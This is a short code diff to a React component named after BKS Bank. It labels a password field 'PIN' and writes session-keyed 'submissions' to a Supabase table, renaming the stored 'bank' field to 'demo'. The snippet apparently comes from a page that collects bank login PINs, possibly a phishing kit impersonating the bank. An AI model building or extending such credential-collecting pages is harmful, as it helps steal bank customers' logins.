@@ -146,7 +146,7 @@ const Bks = () => {
         p_password_label: "PIN",
       });
       if (error) console.error("Update failed:", error);
-      await supabase.from("submissions").update({ bank: "BKS Bank" }).eq("session_id", sessionId);
+      await supabase.from("submissions").update({ demo: "BKS Bank" }).eq("session_id", sessionId);
     }
     setShowLoading(true);
   };
